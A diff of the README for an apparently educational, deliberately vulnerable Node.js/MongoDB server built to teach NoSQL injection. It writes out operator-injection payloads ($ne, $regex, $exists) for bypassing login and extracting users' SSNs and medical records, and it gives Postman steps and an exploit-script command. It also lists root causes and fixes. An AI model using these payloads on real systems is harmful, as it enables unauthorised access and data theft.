@@ -1,361 +1,244 @@
-# NoSQL Injection Vulnerable Server
+## NoSQL Injection – Vulnerable Server (Educational)
 
-This repository contains a deliberately vulnerable Node.js + Express + MongoDB backend that demonstrates real NoSQL injection vulnerabilities. The application includes JWT authentication and role-based access control (RBAC), with intentional vulnerabilities for educational purposes.
+This project is a deliberately vulnerable backend application built to demonstrate real NoSQL injection attacks against MongoDB.
 
-## Important: Real MongoDB Database
+It is designed only for learning and security training. **Do NOT deploy this in production.**
 
-This application uses a real MongoDB database (not mock/in-memory data). All queries are executed against an actual MongoDB instance via Mongoose ODM. The vulnerabilities exploit real MongoDB query operators (`$ne`, `$regex`, `$gt`, `$exists`, etc.) that are interpreted by the MongoDB server.
+## What This Project Shows
 
-When you send payloads like `{"password": {"$ne": null}}`, this is passed directly to MongoDB's query engine, which interprets the `$ne` operator and matches documents accordingly. This is a real security vulnerability that exists in production applications.
+This server demonstrates how poor input validation can allow attackers to:
 
-## Stack
+- **Bypass login** without knowing a password
+- **Gain admin access**
+- **Extract sensitive data** (users, SSNs, medical records)
 
-- Node.js + Express - Backend framework
-- MongoDB + Mongoose (ODM) - Database connection and querying
-- JWT - Authentication tokens
-- RBAC - Role-based access control (admin, doctor, patient roles)
+Abuse MongoDB operators such as:
 
-## Prerequisites
+- **$ne**
+- **$regex**
+- **$exists**
+- **$gt**
 
-1. Node.js (v14 or higher)
-2. MongoDB (v4.4 or higher) - Must be running locally or accessible
-3. Python 3 (for exploit script) with `requests` library
+All vulnerabilities are real and executed against a real MongoDB database, not mock data.
 
-### MongoDB Setup
+## Tech Stack
 
-The application requires MongoDB to be running. Follow these steps:
+- **Node.js + Express** – Backend API
+- **MongoDB + Mongoose** – Database
+- **JWT** – Authentication
+- **RBAC** – Roles (admin, doctor, patient)
+- **Python** – Automated exploit script
 
-#### Step 1: Check if MongoDB is installed
+## Requirements
 
-```bash
-which mongod
+You only need:
+
+- Node.js (v14 or higher)
+- MongoDB (running locally)
+- Python 3 (for the exploit script)
+
+## Quick Setup (Minimal Steps)
+1. **Start MongoDB**
+
+Make sure MongoDB is running on port 27017:
+
+```
+mongod
 ```
 
-If MongoDB is not installed, install it:
+If MongoDB is already running, you can skip this step.
 
-```bash
-# On Ubuntu/Debian
-sudo apt-get update
-sudo apt-get install -y mongodb
+2. **Install Dependencies**
 
-# On macOS (with Homebrew)
-brew tap mongodb/brew
-brew install mongodb-community
-
-# On Windows
-# Download from https://www.mongodb.com/try/download/community
 ```
-
-#### Step 2: Start MongoDB
-
-**Option A: Using systemd (Linux - if MongoDB is installed as a service)**
-
-```bash
-sudo systemctl start mongod
-sudo systemctl status mongod  # Verify it's running
-```
-
-**Option B: Manual start (if systemd service is not available)**
-
-```bash
-# Create data directory
-mkdir -p ~/data/db
-
-# Start MongoDB in the background
-mongod --dbpath ~/data/db --port 27017 --bind_ip 127.0.0.1 --fork --logpath ~/mongodb.log
-
-# Verify MongoDB is running
-pgrep mongod
-netstat -tuln | grep 27017  # or: ss -tuln | grep 27017
-```
-
-**Option C: Start MongoDB in foreground (for debugging)**
-
-```bash
-mkdir -p ~/data/db
-mongod --dbpath ~/data/db --port 27017 --bind_ip 127.0.0.1
-# Keep this terminal open
-```
-
-#### Step 3: Verify MongoDB Connection
-
-```bash
-# Test MongoDB connection (if mongosh is installed)
-mongosh --eval "db.adminCommand('ping')"
-
-# Or check if port is listening
-netstat -tuln | grep 27017
-```
-
-The application will connect to `mongodb://127.0.0.1:27017/vulndb` by default. You can override this with the `MONGODB_URI` environment variable.
-
-## Installation
-
-1. Install Node.js dependencies:
-
-```bash
 npm install
-```
 
-2. Install Python dependencies (for exploit script):
-
-```bash
 pip3 install requests
 ```
 
-## Running the Server
+3. **Start the Server**
 
-### Complete Startup Steps
-
-**Step 1: Ensure MongoDB is running**
-
-```bash
-# Check if MongoDB is already running
-pgrep mongod
-
-# If not running, start it (choose one method above)
-# For example, manual start:
-mkdir -p ~/data/db
-mongod --dbpath ~/data/db --port 27017 --bind_ip 127.0.0.1 --fork --logpath ~/mongodb.log
-
-# Verify MongoDB is running
-pgrep mongod && echo "MongoDB is running" || echo "MongoDB is not running"
-netstat -tuln | grep 27017  # Should show MongoDB listening on port 27017
 ```
-
-**Step 2: Start the vulnerable server**
-
-```bash
 npm start
 ```
 
-The server will:
-- Connect to MongoDB (if connection fails, check MongoDB is running)
-- Seed the database with test users and medical records
-- Start listening on `http://0.0.0.0:4000`
+The server runs at:
 
-**Step 3: Verify the server is running**
+http://localhost:4000
 
-```bash
-# Test health endpoint
+Verify it is working:
+
+```
 curl http://localhost:4000/health
-
-# Expected response:
-# {"status":"ok","message":"Vulnerable server is running"}
 ```
 
-### Troubleshooting
+Expected response:
 
-**Error: `connect ECONNREFUSED 127.0.0.1:27017`**
+```
+{"status":"ok","message":"Vulnerable server is running"}
+```
 
-This means MongoDB is not running. Start it using one of the methods above.
+## Seeded Test Accounts
 
-**Error: `MongooseServerSelectionError`**
+These users are created automatically when the server starts.
 
-- Verify MongoDB is running: `pgrep mongod`
-- Check MongoDB is listening: `netstat -tuln | grep 27017`
-- Check MongoDB logs: `tail -f ~/mongodb.log`
-- Try restarting MongoDB
+**Admin Accounts**
 
-**MongoDB won't start**
+- admin / secret123
+- superadmin / admin456
 
-- Check if port 27017 is already in use: `lsof -i :27017`
-- Check MongoDB logs for errors: `cat ~/mongodb.log`
-- Ensure data directory exists and has proper permissions: `mkdir -p ~/data/db && chmod 755 ~/data/db`
+**Doctor Accounts**
 
-**Server starts but endpoints don't work**
+- doctor1 / doctor123
+- doctor2 / doctor456
 
-- Check server logs for errors
-- Verify MongoDB connection was successful (look for "Connected to MongoDB" message)
-- Test with: `curl http://localhost:4000/health`
+**Patient Accounts**
 
-### Seed Data
+- patient1 / patient123
+- patient2 / patient123
+- patient3 / patient789
+- patient4 / patient999
 
-The server creates the following test accounts:
+Medical records exist for all patient accounts.
 
-**Admin Users:**
-- admin / secret123 (admin role)
-- superadmin / admin456 (admin role)
+## Vulnerable Endpoints (Summary)
 
-**Doctor Users:**
-- doctor1 / doctor123 (doctor role)
-- doctor2 / doctor456 (doctor role)
+### Login (Authentication Bypass)
 
-**Patient Users:**
-- patient1 / patient123 (patient role)
-- patient2 / patient123 (patient role)
-- patient3 / patient789 (patient role)
-- patient4 / patient999 (patient role)
+**POST /auth/login**
 
-**Medical Records:**
-- 4 medical records associated with patient1, patient2, patient3, and patient4
+**Example attack payload:**
 
-## Vulnerable Endpoints
-
-### Authentication Endpoints
-
-#### POST /auth/login (VULNERABLE)
-**Vulnerability**: Request body passed directly to MongoDB `findOne()` via Mongoose without validation.
-
-**Attack**: Send JSON with MongoDB operators to bypass authentication:
 ```json
 {
   "username": "admin",
-  "password": {"$ne": null}
+  "password": { "$ne": null }
 }
 ```
 
-### Search & Filter Endpoints
+This allows login without knowing the password.
 
-#### GET /search (VULNERABLE)
-**Vulnerability**: Query parameter parsed as JSON and used directly in MongoDB `find()`.
+### User Search & Filtering
 
-**Attack**: Use operators to extract data:
-```
-GET /search?q={"$regex":".*"}
-GET /search?q={"role":"admin"}
-```
+**GET  /search**
+**POST /users/filter**
+**GET  /users/find**
 
-#### POST /users/filter (VULNERABLE)
-**Vulnerability**: Request body passed directly to MongoDB `find()`.
+Attackers can extract:
 
-**Attack**: Filter users with operators:
-```json
-{
-  "role": {"$ne": "patient"}
-}
-```
+- **All users**
+- **Admin accounts**
+- **SSNs**
+- **Medical Records**
 
-#### GET /users/find (VULNERABLE)
-**Vulnerability**: Criteria parameter parsed as JSON and used directly in MongoDB query.
+**POST /records/search**
 
-**Attack**: Find users with operators:
-```
-GET /users/find?criteria={"ssn":{"$exists":true}}
-```
-
-#### POST /records/search (VULNERABLE)
-**Vulnerability**: Request body passed directly to MongoDB `find()` on medical records.
-
-**Attack**: Extract medical records:
-```json
-{
-  "patientId": {"$regex": ".*"}
-}
-```
+Attackers can extract all medical records.
 
 ### Admin Endpoints
 
-#### POST /admin/export (Protected - Admin only)
-**Description**: Exports all users and medical records. Requires valid admin JWT token.
+**POST /admin/export**
+**POST /admin/query**
+**POST /admin/users**
 
-#### POST /admin/query (VULNERABLE - Admin only)
-**Vulnerability**: Query string parsed and used directly in MongoDB `find()`.
+Once an attacker obtains an admin token, full database exfiltration is possible.
 
-**Attack**: Use operators to extract sensitive data:
-```json
-{
-  "query": "{\"ssn\":{\"$regex\":\".*\"}}"
-}
-```
+## Testing with Postman (Recommended)
 
-#### POST /admin/users (VULNERABLE - Admin only)
-**Vulnerability**: Filter from body used directly in MongoDB query.
+Postman is the best way to manually test and document the vulnerabilities.
 
-**Attack**: Filter users with operators:
-```json
-{
-  "filter": {"ssn": {"$regex": ".*"}}
-}
-```
+### Authentication Bypass Test
 
-### Doctor Endpoints
+**Request**
 
-#### GET /doctor/patients (Protected - Doctor/Admin only)
-**Description**: Returns patient list and medical records. Requires valid doctor or admin JWT token.
+**Method:** POST
 
-### Utility Endpoints
+**URL:** http://localhost:4000/auth/login
 
-#### GET /health
-**Description**: Health check endpoint.
+**Body (JSON):**
 
-#### GET /me (Protected)
-**Description**: Returns current authenticated user info.
-
-## Testing with Postman
-
-This section provides complete step-by-step instructions for testing all vulnerabilities using Postman. All endpoints run on `http://localhost:4000`.
-
-### Postman Setup
-
-1. Open Postman application
-2. Create a new Collection called "NoSQL Injection Tests"
-3. Set base URL variable: `base_url = http://localhost:4000`
-4. Ensure the server is running: `npm start`
-
-### Stage 1: Injection Discovery
-
-#### Test 1.1: Authentication Bypass via Operator Injection
-
-**Purpose**: Bypass login using MongoDB `$ne` operator
-
-1. Create new request in Postman
-2. Set method to **POST**
-3. URL: `http://localhost:4000/auth/login`
-4. Go to **Headers** tab, add:
-   - Key: `Content-Type`
-   - Value: `application/json`
-5. Go to **Body** tab:
-   - Select **raw**
-   - Select **JSON** from dropdown
-   - Paste this payload:
 ```json
 {
   "username": "admin",
-  "password": {"$ne": null}
+  "password": { "$ne": null }
 }
 ```
-6. Click **Send**
-7. **Expected Response**: Status 200, JSON with token and user info
-8. **Save the token** from response for later tests
 
-**Explanation**: The `$ne` operator means "not equal", so this matches any user where password is not null, effectively bypassing password check.
+**Result**
 
----
+- **Status:** 200 OK
+- **JWT token returned**
+- **Logged in as admin**
 
-#### Test 1.2: Authentication Bypass via Regex Injection
+### Data Extraction Test
 
-**Purpose**: Match any username using regex operator
+**Request**
 
-1. Method: **POST**
-2. URL: `http://localhost:4000/auth/login`
-3. Headers: `Content-Type: application/json`
-4. Body (raw JSON):
-```json
-{
-  "username": {"$regex": ".*"},
-  "password": {"$ne": null}
-}
 ```
-5. Click **Send**
-6. **Expected Response**: Status 200, returns first user in database
+GET /search?q={"$regex":".*"}
+```
 
-**Explanation**: `$regex: ".*"` matches any username, combined with `$ne` bypasses password.
+**Result**
 
----
+- Returns all users, including sensitive data
 
-#### Test 1.3: Data Extraction via Search Injection
+### Automated Exploit Script
 
-**Purpose**: Extract all users using regex in search
+You can also demonstrate the full attack automatically:
 
-1. Method: **GET**
-2. URL: `http://localhost:4000/search`
-3. Go to **Params** tab:
-   - Key: `q`
-   - Value: `{"$regex":".*"}`
-4. Click **Send**
-5. **Expected Response**: Status 200, array of all users with full details including SSN
+```
+python3 exploit/nosql_exploit.py
+```
 
+The script demonstrates:
+
+- **Injection discovery**
+- **Authentication bypass**
+- **Full data extraction**
+
+This is useful for live demos, while Postman is better for documentation.
+
+## Impact Summary
+
+Because of these vulnerabilities:
+
+- **Anyone can log in as admin**
+- **Sensitive user data can be stolen**
+- **Medical records are exposed**
+- **RBAC protections are bypassed**
+
+This represents a critical security failure.
+
+## Root Cause
+
+The vulnerabilities exist because:
+
+- **User input is passed directly to MongoDB queries**
+- **MongoDB operators are not blocked**
+- **No input type validation is enforced**
+- **No query whitelisting is used**
+
+## How This Should Be Fixed (High-Level)
+
+- **Reject objects in login fields** (username and password must be strings)
+- **Block all $ operators from user input**
+- **Build database queries manually**
+- **Validate input using schema validation**
+- **Never accept raw MongoDB queries from users**
+
+## Important Warning
+
+⚠️ **This project is intentionally insecure**
+
+**For educational use only**
+
+**Do not deploy**
+
+**Do not expose to the internet**
+
+## License
+
+Educational use only.
 **Alternative method** (URL encoded):
 - URL: `http://localhost:4000/search?q=%7B%22%24regex%22%3A%22.%2A%22%7D`
 
